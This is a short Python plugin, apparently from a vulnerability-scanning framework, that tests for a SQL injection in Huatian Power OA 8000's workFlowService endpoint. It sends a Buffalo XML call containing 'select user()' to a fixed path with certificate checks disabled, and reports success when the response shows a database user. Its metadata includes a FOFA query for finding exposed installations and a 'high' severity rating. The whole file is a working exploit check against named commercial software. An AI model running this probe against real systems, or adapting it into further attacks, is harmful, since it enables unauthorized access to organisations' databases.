#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

    'links'     :  "'https://mp.weixin.qq.com/s/bY4c4bS4hJHsetmisNljKQ','https://peiqi.wgpsec.org/wiki/oa/华天OA/华天动力OA 8000版 workFlowService SQL注入漏洞.html'",

    'huixian'   :  '',

    'method'    :   'post',

    'bugname'   :   '华天动力OA workFlowService SQL注入',

    'level'     :   'high',

    'FOFA'      :   'app="华天动力-OA8000"',

    'author'    :   'ppxfx',

    'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'AAccept-Encoding': 'identity'
      }
  target = '/OAapp/bfapp/buffalo/workFlowService'
  data = '''
<buffalo-call> 
<method>getDataListForTree</method> 
<string>select user()</string> 
</buffalo-call>

  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r"</string>.*?<string>.*?@.*?</string>.*?</map>",res.text,re.S):
      ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret